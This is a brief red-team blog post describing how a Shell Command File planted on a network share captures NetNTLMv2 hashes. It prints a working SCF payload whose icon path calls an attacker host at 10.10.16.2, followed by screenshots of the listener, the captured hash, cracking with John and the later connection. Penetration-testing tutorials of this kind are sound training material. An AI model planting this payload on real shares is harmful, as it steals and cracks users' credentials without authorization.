---
title:  "using-a-scf-file-to-gather-hashes"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: SMB-SCF  File Attacks(NetNTLMv2 hash(challenge) grab)
categories:
  - Red-Teaming
toc: true
---

## Gathering Hashes
It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer.
However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack.
The code below can be placed inside a text file which then needs to be planted into a network share.

```
[shell]
Command=2
IconFile=\\10.10.16.2\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

<img src="/img/fci/pay.PNG" alt="Getting-gz" width="800" height="200"> 

<img src="/img/fci/listner.PNG" alt="Getting-gz" width="800" height="200"> 

<img src="/img/fci/hash.PNG" alt="Getting-gz" width="800" height="200"> 


<img src="/img/fci/john.PNG" alt="Getting-gz" width="800" height="200"> 


<img src="/img/fci/connect.PNG" alt="Getting-gz" width="800" height="200"> 

  
                       
